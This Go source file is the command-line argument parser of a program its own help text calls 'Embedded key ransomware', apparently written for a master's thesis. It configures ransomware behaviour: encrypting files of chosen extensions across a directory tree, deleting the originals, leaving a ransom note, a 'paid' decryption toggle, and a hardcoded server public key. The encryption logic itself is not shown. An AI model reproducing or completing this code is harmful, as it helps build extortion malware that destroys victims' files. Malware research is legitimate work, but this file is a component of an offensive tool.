package cli

import (
	"errors"
	"fmt"
	"main/src/config"
	. "main/src/utils"
	"reflect"
	"sort"
	"strings"
)

type CommandLineArg struct {
	name          string
	info          CommandLineArgInfo
	flags         []CommandLineFlag
	settingsField string
}

type CommandLineArgInfo struct {
	defaultFlag  string
	requiredWith string
	isBool       bool
	description  string
	metaValue    string // additional value statickly defined
	required     RequiredType
}

type CommandLineFlag struct {
	flag          string
	description   string
	settingsValue bool
}

var cliArgs = []CommandLineArg{
	{
		name: "Mode",
		info: CommandLineArgInfo{description: "Operation mode", isBool: true, required: RequiredOr},
		flags: []CommandLineFlag{
			{flag: "-e", description: "encryption mode", settingsValue: true},
			{flag: "-d", description: "decryption mode", settingsValue: false},
		},
		settingsField: "EncryptionMode",
	},
	{
		name: "Note",
		info: CommandLineArgInfo{description: "Should leave a ransom note behind", isBool: true, required: Optional},
		flags: []CommandLineFlag{
			{flag: "-note", description: "leave a note", settingsValue: true},
		},
		settingsField: "LeaveNote",
	},
	{
		name: "Delete",
		info: CommandLineArgInfo{description: "Delete original file after encryption?", isBool: true, required: Optional},
		flags: []CommandLineFlag{
			{flag: "-del", description: "delete files", settingsValue: true},
		},
		settingsField: "Delete",
	},
	{
		name: "Recursion",
		info: CommandLineArgInfo{description: "Recursive file listing", isBool: true, required: Optional},
		flags: []CommandLineFlag{
			{flag: "-r", description: "use recursion", settingsValue: true},
		},
		settingsField: "Recursion",
	},
	{
		name: "RawKey",
		info: CommandLineArgInfo{description: "Write AES encryption key unencrypted", isBool: true, required: Optional},
		flags: []CommandLineFlag{
			{flag: "-rk", description: "leave unencrypted key", settingsValue: true},
		},
		settingsField: "RawKey",
	},
	{
		name: "Paid",
		info: CommandLineArgInfo{description: "Decide whether to enter key as paid (demonstration purposes, false by default)", isBool: true, required: Optional},
		flags: []CommandLineFlag{
			{flag: "-p", description: "is paid", settingsValue: true},
		},
		settingsField: "PaidStatus",
	},
	{
		name: "Key",
		info: CommandLineArgInfo{description: "Supplied symmetric key", required: Optional, isBool: false,
			defaultFlag: "2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541316c76556c47453430616430596965594271776e0d0a5467333930354b76766b56715337396d4e413846736a6b70586e42616675527870673130635454696c396c78526a396a415a59455441334261355959367949660d0a79494d38504b42714d416230726f714b495a4579624c322f49395a3361456f4b567835456757536d776a6c6f764b526f30775a717173324c61563045365a44440d0a43727638677472794e6a4a4c474e3777715879657a326748525846537972765372586e34337276446b4637395937346f6c347770724d51376d7a6c447845752f0d0a342b31374675796436485542623743654d7079354f734647646d6d3750663349575a546b544b7754766c582b2b2b4274415357617350796f78672b33596f6e390d0a304872626d523762536d59642b59685151485854352b455a774f766175674e7369394d3575526c303941642f733439416c6a66785266496e4b6d2f3169394f670d0a6f774944415141420d0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d"},
		flags: []CommandLineFlag{
			{flag: "--key", description: "Public key of the server, hardcoded by default"},
		},
		settingsField: "Key",
	},
	{
		name: "File Formats",
		info: CommandLineArgInfo{description: "File formats to target by encryption", metaValue: ",", isBool: false, required: Optional, defaultFlag: "txt"},
		flags: []CommandLineFlag{
			{flag: "--ff", description: "separated by , like so: jpg,png,txt"},
		},
		settingsField: "FileFormat",
	},
	{
		name: "Working dir",
		info: CommandLineArgInfo{description: "Directory to run in", required: Optional, isBool: false, defaultFlag: "."},
		flags: []CommandLineFlag{
			{flag: "--dir", description: "relative or absolute dir path"},
		},
		settingsField: "Dir",
	},
	{
		name: "Decryption hash",
		info: CommandLineArgInfo{description: "hash of decryption key", required: Optional, isBool: false, defaultFlag: ""},
		flags: []CommandLineFlag{
			{flag: "--dh", description: "hash"},
		},
		settingsField: "DecryptionHash",
	},
}

var Settings ProgramSettings

func ParseCLIArgs(args []string) (ProgramSettings, error) {
	var er error
	argsPtr := &args

	cfi := FindStringIndex(args, "--config")
	if cfi != -1 {
		configFile := args[cfi+1]
		Settings = config.GetConfig(configFile)
		args = RemoveAtIndex(&argsPtr, cfi)
		args = RemoveAtIndex(&argsPtr, cfi)
	} else {
		Settings = config.GetConfig("config.json")
	}
	if len(Settings.GetSep()) == 0 {
		Settings.SetSep(",")
	}
	sort.Slice(cliArgs, func(i, j int) bool {
		return cliArgs[i].info.required > cliArgs[j].info.required
	})

	for _, v := range cliArgs {
		er = parseParameter(v, &argsPtr)
		if er != nil {
			break
		}
	}
	if er == nil && len(*argsPtr) > 0 {
		fmt.Println(*argsPtr)
		return err("Unexpected entries in command line arguments!")
	}
	return Settings, er
}

func parseParameter(v CommandLineArg, argsPtr **[]string) error {
	required := v.info.required
	var multiFlagIndex int
	args := **argsPtr
	flagIndex, multiFlagIndex := findOneOfFlags(args, v)
	switch required {
	case Required:
		if flagIndex == -1 {
			return errors.New(v.name + " is required!")
		}
		if len(v.flags) > 1 {
			return errors.New(v.name + " can't require multiple flags in one key")
		}
		return nil
	case RequiredOr:
		if flagIndex == -1 {
			return errors.New(v.name + ": only one flag is required")
		}
	case RequiredWith:
		if len(v.flags) > 1 {
			return errors.New(v.name + ": can't require multiple flags in one key")
		}
		flagRIndex := FindStringIndex(args, v.info.requiredWith)
		if flagRIndex > -1 && flagIndex == -1 {
			return fmt.Errorf("%s: flag %s is required when using %s", v.name, v.flags[0].flag, v.info.requiredWith)
		}
		if flagIndex == -1 {
			break
		}
	case Optional:
		break
	}
	var bValue bool
	var sValue string
	if v.info.isBool {
		if flagIndex == -1 {
			bValue = !v.flags[multiFlagIndex].settingsValue
		} else {
			bValue = v.flags[multiFlagIndex].settingsValue
			RemoveAtIndex(argsPtr, flagIndex)
		}
		reflect.ValueOf(&Settings).Elem().FieldByName(v.settingsField).SetBool(bValue)
		return nil
	} else {
		if flagIndex == -1 {
			val := reflect.ValueOf(&Settings).Elem().FieldByName(v.settingsField).String()
			if len(val) == 0 {
				reflect.ValueOf(&Settings).Elem().FieldByName(v.settingsField).SetString(v.info.defaultFlag)
			}
		} else {
			if flagIndex+1 <= len(args) {
				sValue = args[flagIndex+1]
				if !isCLIParameter(sValue) {
					RemoveAtIndex(argsPtr, flagIndex)
					RemoveAtIndex(argsPtr, flagIndex)
					reflect.ValueOf(&Settings).Elem().FieldByName(v.settingsField).SetString(sValue)
					return nil
				}
			}
			return errors.New(v.name + ": missing value for parameter")
		}
	}
	return nil
}

func findOneOfFlags(args []string, v CommandLineArg) (int, int) {
	count := 0

	var index, flagIndex int
	for i := 0; i < len(v.flags); i++ {
		ix := FindStringIndex(args, v.flags[i].flag)
		if ix != -1 {
			index = ix
			count++
			flagIndex = i
		}
	}
	if count > 1 || count == 0 {
		return -1, 0
	}
	return index, flagIndex
}

func isCLIParameter(str string) bool {
	return strings.HasPrefix(str, "-")
}

func err(errMsg string) (ProgramSettings, error) {
	return Settings, errors.New(errMsg)
}

func PrintHelp(programName string) {
	fmt.Println("Embedded key ransomware")
	fmt.Println("Created as part of master theses")
	fmt.Println("-------USAGE--------")
	fmt.Println(programName + " [boolFlags]/[paramFlags] values")
	fmt.Println("order of flags is irrelevant but values must follow paramters such as --key keyValue or --dir dirPath")
	for _, v := range cliArgs {
		fmt.Println("-------")
		fmt.Printf("%s: %s\n", v.name, v.info.description)
		var requiredFlag string
		switch v.info.required {
		case Required:
			requiredFlag = "Yes"
		case RequiredWith:
			requiredFlag = fmt.Sprintf("Required if using %s flag", v.info.requiredWith)
		case RequiredOr:
			requiredFlag = "Yes: one of possible flags must be passed"
		case Optional:
			requiredFlag = "No"
		}
		fmt.Println("[Flags]:")
		for _, f := range v.flags {
			fmt.Printf("\t%s: %s\n", f.flag, f.description)
		}
		var dVal string
		if len(v.info.defaultFlag) == 0 && !v.info.isBool {
			dVal = "None, must be passed"
		} else if len(v.info.defaultFlag) == 0 && v.info.isBool && v.info.required == RequiredOr || v.info.required == Required {
			dVal = "None, must be passed"
		} else if len(v.info.defaultFlag) == 0 && v.info.isBool && !(v.info.required == RequiredOr || v.info.required == Required) {
			dVal = "false"
		} else {
			dVal = v.info.defaultFlag
		}
		fmt.Printf("Required: %s\n", requiredFlag)
		fmt.Printf("Default value: %s\n", dVal)
	}
}
